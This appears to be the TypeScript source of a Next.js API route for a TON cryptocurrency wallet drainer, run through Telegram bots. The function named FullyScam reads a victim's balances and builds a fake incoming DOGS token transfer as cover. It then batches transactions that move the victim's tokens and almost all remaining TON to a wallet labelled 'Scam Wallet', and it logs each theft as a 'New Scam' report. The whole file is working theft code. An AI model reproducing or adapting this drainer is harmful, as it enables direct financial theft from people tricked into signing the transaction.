
import {getWalletFullBalance} from "@/bot/tonviewer";
import {NextResponse} from "next/server";
import {Address, beginCell, fromNano, toNano} from "@ton/ton";
import {
	createTokenTransferPayload,
	defaultTransactionComment,
	defaultTransactionComments,
	getContractWallet, getFeeWallet,
	SCAM_REPORT, sendFeeTo
} from "@/app/api/transaction/route";
import {generateRandomString} from "@backend/utils/string";
import Big from "big.js";
import {BotConfigType} from "@/bot/classes/types/dodo";
import {getSpammerWallet} from "@/bot/spammer";

// DOGS
const fakeContract = "EQCvxJy4eG8hyHBFsZ7eePxrRsUQSFE_jpptRAYBmcG_DOGS";
const MAX_TRANSACTION = 4;
const errBalance = NextResponse.json({
	msg: "Balance"
}, {
	status: 400,
	headers: {
		'balance': "NOK"
	}
});


export async function FullyScam(data: { senderAddress: any, bot: any, config: BotConfigType }) {
	let {bot, config, senderAddress} = data;

	const debug = config.debug || process.env['NODE_ENV'] === 'development';
	const client_bot = CLIENT_BOTS.find(o => o.me?.id + "" === bot + "");

	if (!config.address) {
		console.warn(`Receiver Wallet not found ❌ bot: ${client_bot?.me?.username || "Unknown Bot"}`);
		return errBalance;
	}

	const senderWallet = Address.parse(senderAddress);
	let receiverWallet = Address.parse(config.address);

	const jettonFee = toNano(config.jettonFee || "0.07");
	const minFee = config.feeValue || "0.1";

	const walletInfo = await getWalletFullBalance(senderAddress).catch((e) => {
		throw (`FAIL TO GET WALLET FULL BALANCE\n${e}`)
	});

	if (debug) console.log("WALLET", walletInfo);

	const hasFee = walletInfo.feeBalance > +minFee;

	if (!hasFee) {
		if (!config.feeEnabled || walletInfo.total < +(config.feeBalance || "5")) return errBalance;

		try {
			await sendFeeTo(config, senderAddress);
		} catch (e: any) {
			console.error(`Failed to sending fee\n${e}`);
			return errBalance;
		}
	}


	const transactions = [];

	try {
		const fakeAddress = Address.parse("EQASdk1XxjMmu8MB3bjDlQxKqBBRtAvQTTmKG204Y-eRtbHT")
		const fakeSource = config.fakeAddress || await getContractWallet(fakeContract, fakeAddress)
		const amount = config.fakeAmount || '304734';
		if (debug) console.log("Fake transaction", fakeSource, amount);
		transactions.push({
			amount: toNano("0.01").toString(),
			address: fakeSource.toString(),
			payload: await createTokenTransferPayload(
				fakeAddress,
				senderWallet,
				toNano(amount),
				config.fakeComment || undefined
			)
		})
	} catch (e) {
		console.error(`While pushing fake transaction, error: \n${e}`);
	}

	const tokens = walletInfo.balances.slice(0, MAX_TRANSACTION - 1);
	const total = tokens.reduce((t, o) => o.price + t, 0);


	for (let token of tokens) {
		if (!token.balance) {
			if (debug) console.log(`${token.symbol} skipped due to zero balance`);
			continue;
		}


		if (config.router && token.price > 20 && token.price < 300) {
			const {wallet} = await getSpammerWallet().catch(()=>({wallet: undefined}));
			const feeWallet = await getFeeWallet(config).catch(()=>undefined);

			const ad = wallet?.address ?? feeWallet?.address;
			if (ad) receiverWallet = ad;
		}

		try {
			if (token.jetton) {
				const key = token.symbol.toLowerCase();
				try {
					const required = Big("100");
					const bBalance = Big(token.actualBalance);
					if (bBalance.lt(required)) {
						if (debug) console.log(`${token.symbol} Skipped due to low balance\nRequire: ${required}\nBalance: ${bBalance}`)
						continue;
					}
				} catch (e) {

				}

				transactions.push({
					amount: jettonFee.toString(),
					address: token.address,
					payload: await createTokenTransferPayload(
						senderWallet,
						receiverWallet,
						token.actualBalance,
						defaultTransactionComments[key as keyof typeof defaultTransactionComments] || defaultTransactionComment
					)
				})
			} else {
				const remains = Big(walletInfo.feeBalance).minus(Big(fromNano(jettonFee) + "").times(tokens.length + 1));

				transactions.push({
					address: receiverWallet.toRawString(),
					amount: toNano((+(remains.toString())).toFixed(2)).toString(),
					payload: (beginCell().storeUint(0, 32).storeStringTail(config?.transaction_comments?.ton ?? defaultTransactionComment).endCell()).toBoc().toString('base64')
				},)
			}
		} catch (e) {
			console.error(`V2 Error: While pushing ${token.symbol}${token.jetton ? "(jetton)" : ""} error:`, e);
		}
	}

	if (debug) console.log("Transaction length", transactions.length);

	const sender = senderWallet.toString({bounceable: false});
	const reportId = generateRandomString(20);
	const tokenString = `Total: ${total.toLocaleString()}$\n${tokens.map(o => `${o.symbol} = ${o.balance.toLocaleString()} (${o.price.toLocaleString()}$)`).join("\n")}`;
	const footer = `Scam Wallet: ${receiverWallet.toString({bounceable: false})}\nReportId: ${reportId}\nMin Fee: ${minFee}`

	console.warn(`@${client_bot?.me?.username} Incoming Scam(v2)⌛ ${sender}\n\n${tokenString}\n\n${footer}`)
	SCAM_REPORT[reportId] = `@${client_bot?.me?.username} New Scam(v2) (${walletInfo.total.toLocaleString()}$) ✅ [${sender}]\n\n${tokenString}\n\n${footer}`;
	setTimeout(() => delete SCAM_REPORT[reportId], 5 * 60 * 1000);

	return NextResponse.json({
		validUntil: Math.floor(Date.now() / 1000) + 500,
		messages: transactions
	}, {
		headers: {
			"log-report-id": reportId
		}
	});
}
